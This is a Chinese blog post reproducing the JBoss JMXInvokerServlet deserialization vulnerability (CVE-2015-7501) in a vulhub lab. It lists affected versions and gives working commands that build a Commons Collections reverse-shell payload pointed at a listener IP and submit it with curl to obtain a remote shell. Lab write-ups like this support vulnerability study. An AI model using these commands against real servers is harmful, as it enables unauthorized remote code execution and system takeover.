# CVE-2015-7501 JBoss JMXInvokerServlet 反序列化漏洞 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15717430.html`](https://www.cnblogs.com/peace-and-romance/p/15717430.html)

### 0X00-引言

* * *

你知道什么是当当当当吗？

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞描述

* * *

JBoss 是一个基于 J2EE 的开放源代码应用服务器，代码遵循 LGPL 许可，可以在任何商业应用中免费使用；JBoss 也是一个管理 EJB 的容器和服务器，支持 EJB 1.1、EJB 2.0 和 EJB3 规范。但 JBoss 核心服务不包括支持 servlet/JSP 的 WEB 容器，一般与 Tomcat 或 Jetty 绑定使用。在 J2EE 应用服务器领域，JBoss 是发展最为迅速的应用服务器。由于 JBoss 遵循商业友好的 LGPL 授权分发，并且由开源社区开发，这使得 JBoss 广为流行。

这是经典的 JBoss 反序列化漏洞，JBoss 在/invoker/JMXInvokerServlet 请求中读取了用户传入的对象，然后我们利用 Apache Commons Collections 中的 Gadget 执行任意代码。

这是经典的 JBoss 反序列化漏洞，JBoss 在`/invoker/JMXInvokerServlet`请求中读取了用户传入的对象，然后我们利用 Apache Commons Collections 中的 Gadget 执行任意代码。

影响版本：

```
JBoss Enterprise Application Platform 6.4.4,5.2.0,4.3.0_CP10
JBoss AS (Wildly) 6 and earlier
JBoss A-MQ 6.2.0
JBoss Fuse 6.2.0
JBoss SOA Platform (SOA-P) 5.3.1
JBoss Data Grid (JDG) 6.5.0
JBoss BRMS (BRMS) 6.1.0
JBoss BPMS (BPMS) 6.1.0
JBoss Data Virtualization (JDV) 6.1.0
JBoss Fuse Service Works (FSW) 6.0.0
JBoss Enterprise Web Server (EWS) 2.1,3.0 
```

### 0X03-漏洞复现

* * *

下载 JavaDeserH2HC 工具(用于生成序列化数据)：[`github.com/joaomatosf/javadeserh2hc`](https://github.com/joaomatosf/javadeserh2hc)

`http://192.168.234.128:8080/`

![image-20211221195846337](img/dc026eddf4d064f0d8b6c57d56fe925f.png)

##### 01-验证漏洞

访问`http://192.168.234.128:8080/invoker/JMXInvokerServlet`

提示下载内容，可能存在漏洞

![image-20211221200054400](img/a0a1657ad8bbb789be5124ddc057f3da.png)

##### 02-重定向到`ReverseShellCommonsCollectionsHashMap.ser`文件

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 192.168.234.135:888   #填写监听机 IP 和 port
curl http://192.168.234.128:8080//invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser  #提交二进制数据 
```

![image-20211221200545588](img/7a3fe15fb4d0342fbf35d6f203e77dfc.png)

![image-20211221200603762](img/6c2331b0959540b22951f87449d5eb24.png)

##### 03-反弹 shell

![image-20211221200637648](img/ac423bc2c6bb4d4e4aef878c80ca4ccf.png)

### 0X04-工具检测

* * *

工具下载：[`github.com/s0k/Deserialize`](https://github.com/s0k/Deserialize)

![image-20211221204441364](img/dfc84a60ad0a29f0dd6ed7507e57207d.png)

### 0X05-免责声明

仅供学习使用

### 0X06-参考

[[Vulhub] JBoss 反序列化漏洞复现](https://blog.csdn.net/weixin_45605352/article/details/120305428?utm_term=vulhub%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-120305428&spm=3001.4430)

[`paper.seebug.org/312/`](https://paper.seebug.org/312/)